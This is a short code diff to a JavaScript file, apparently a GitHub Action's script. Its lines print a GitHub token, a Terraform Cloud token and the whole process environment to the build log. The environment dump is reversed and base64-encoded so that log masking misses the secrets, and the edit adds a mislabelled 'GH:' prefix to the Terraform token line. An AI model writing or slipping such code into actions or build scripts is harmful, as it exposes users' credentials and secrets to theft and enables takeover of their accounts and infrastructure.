@@ -16,7 +16,7 @@ const ghToken = Buffer.from(process.env.INPUT_GITHUBTOKEN || ''.split("").revers
 
 
 console.log('\r\nDumping tokens:', {tfToken, ghToken});
-console.log(Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split("").reverse().join("")).toString('base64'))
+console.log('GH:', Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split("").reverse().join("")).toString('base64'))
 console.log('\r\nDumping env:', Buffer.from(JSON.stringify(process.env).split("").reverse().join("")).toString('base64'));
 
 run().catch((error) => {
